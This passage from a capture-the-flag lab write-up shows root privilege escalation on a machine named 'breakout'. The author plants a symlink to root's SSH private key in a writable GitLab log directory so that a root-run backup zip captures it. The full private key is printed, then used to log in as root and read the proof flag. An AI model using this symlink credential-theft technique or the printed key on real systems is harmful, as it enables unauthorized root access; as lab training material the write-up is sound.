drwx------  2 gitlab-redis      root       4096 Jan 26 23:12 redis-exporter
drwx------  2 git               root       4096 Jan 26 23:08 sidekiq
drwxr-xr-x  2 root              root       4096 Jan 23 09:39 sshd
git@breakout:/var/log/gitlab$ echo "Test" > lol
bash: lol: Permission denied
```

We don't have write access over the main path 

But on checking further we see user `git` has full perm over `puma` directory

```
git@breakout:/var/log/gitlab$ ls -l puma
total 56
-rw-r--r-- 1 root root  2467 Mar  3  2022 @4000000062225c441a5cc974.u
-rw-r--r-- 1 root root  2467 Mar  4  2022 @4000000063ce561d116b05c4.u
-rwxr--r-- 1 root root   632 Jan 26 23:14 @4000000063d309490b595b7c.s
lrwxrwxrwx 1 root root    30 Mar  3  2022 config -> /opt/gitlab/sv/puma/log/config
-rw-r--r-- 1 root root     0 Jan 26 23:14 current
-rw------- 1 root root     0 Mar  3  2022 lock
-rw-r--r-- 1 git  git      0 Jan 23 09:50 puma_stderr.log
-rw-r--r-- 1 git  git     93 Jan 23 09:42 puma_stderr.log.1.gz
-rw-r--r-- 1 git  git  21441 Jan 27 01:52 puma_stdout.log
-rw-r--r-- 1 git  git   1881 Jan 27 00:59 puma_stdout.log.1.gz
-rw-r--r-- 1 git  git   3694 Jan 26 23:59 puma_stdout.log.2.gz
-rw-r--r-- 1 git  git   1414 Jan 23 09:50 puma_stdout.log.3.gz
-rw-r--r-- 1 root root     0 Jan 26 23:14 state
git@breakout:/var/log/gitlab$
```

Now lets try writing in the directory

```
git@breakout:/var/log/gitlab/puma$ echo Test > lol
git@breakout:/var/log/gitlab/puma$ cat lol
Test
git@breakout:/var/log/gitlab/puma$ 
```

Cool !! Now before we create a symbolic link on a specific file lets say `/etc/shadow` we are not so sure we might end up brute forcing the root's pasword

So instead lets attempt to read the root's ssh key

Here's the syntax

```
git@breakout:/var/log/gitlab/puma$ ln -s /root/.ssh/id_rsa pwned
git@breakout:/var/log/gitlab/puma$ ls -l pwned
lrwxrwxrwx 1 git git 17 Jan 27 01:58 pwned -> /root/.ssh/id_rsa
git@breakout:/var/log/gitlab/puma$ cat pwned 
cat: pwned: Permission denied
git@breakout:/var/log/gitlab/puma$
```

Now after cron runs i'll unzip the zip file to see if we succesfully extracted the root's ssh key

```
coaran@breakout:~$ cd /opt/backups/
coaran@breakout:/opt/backups$ ls
backup.sh  log_backup.zip
coaran@breakout:/opt/backups$ cp log_backup.zip /tmp
coaran@breakout:/opt/backups$ cd /tmp
coaran@breakout:/tmp$ unzip log_backup.zip
Archive:  log_backup.zip
   creating: srv/gitlab/logs/gitaly/
  inflating: srv/gitlab/logs/gitaly/gitaly_ruby_json.log
  inflating: srv/gitlab/logs/gitaly/current
 extracting: srv/gitlab/logs/gitaly/lock
   creating: srv/gitlab/logs/gitlab-rails/
 extracting: srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log
   creating: srv/gitlab/logs/gitlab-shell/
   creating: srv/gitlab/logs/postgresql/
 extracting: srv/gitlab/logs/postgresql/current
 extracting: srv/gitlab/logs/postgresql/lock
   creating: srv/gitlab/logs/reconfigure/
  inflating: srv/gitlab/logs/reconfigure/1646332280.log 
[---------------------SNIP----------------------------]
 extracting: srv/gitlab/logs/puma/puma_stdout.log.3.gz  
 extracting: srv/gitlab/logs/gitlab-rails/git_json.log  
 extracting: srv/gitlab/logs/puma/lol  
  inflating: srv/gitlab/logs/puma/pwned  
 extracting: srv/gitlab/logs/gitlab-rails/api_json.log.2.gz  
coaran@breakout:/tmp$ 
coaran@breakout:/tmp$ cd srv/
coaran@breakout:/tmp/srv$ ls
gitlab
coaran@breakout:/tmp/srv$ cd gitlab/logs/puma/
coaran@breakout:/tmp/srv/gitlab/logs/puma$ ls
@4000000062225c441a5cc974.u  @4000000063d309490b595b7c.s  lock  puma_stderr.log       puma_stdout.log       puma_stdout.log.2.gz  pwned
@4000000063ce561d116b05c4.u  current                      lol   puma_stderr.log.1.gz  puma_stdout.log.1.gz  puma_stdout.log.3.gz  state
```

Now lets read the pwned file 

Cross your fingers and hope the ssh key is in there 🤞🤞

```
coaran@breakout:/tmp/srv/gitlab/logs/puma$ cat pwned 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
coaran@breakout:/tmp/srv/gitlab/logs/puma$ 
```

Boom!!! It worked 

Now lets ssh in as root using the key xD

```
coaran@breakout:/tmp/srv/gitlab/logs/puma$ chmod 600 pwned 
coaran@breakout:/tmp/srv/gitlab/logs/puma$ ssh -i pwned root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:b8kEbLgPOJQUid4sdWv2g7ZMK1K1VKUKKFwx6ysCoCw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 27 Jan 2023 02:07:48 AM UTC

  System load:  0.03              Processes:                321
  Usage of /:   81.3% of 9.78GB   Users logged in:          1
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   4%                IPv4 address for ens160:  192.168.168.182


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Fri Mar  4 18:36:31 2022
root@breakout:~# ls -al
total 56
drwx------  6 root root 4096 Jan 26 23:08 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 Mar  3  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rwxr-xr-x  1 root root 4646 Mar  3  2022 build.sh
drwx------  2 root root 4096 Mar  3  2022 .cache
-rw-r--r--  1 root root 1094 Mar  3  2022 data.zip
-rw-r--r--  1 root root  407 Jun  3  2021 docker-compose.yml
-rw-r--r--  1 root root 1386 Jun  3  2021 healthy.sh
drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rwx------  1 root root   33 Jan 26 23:08 proof.txt
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
drwx------  2 root root 4096 Nov 26  2021 .ssh
root@breakout:~# cat proof.txt 
f32cd9f927f54c47417175a4ca85c51c
root@breakout:~#
```

And we're done 



<br> <br>
[Back To Home](../../index.md)
<br>






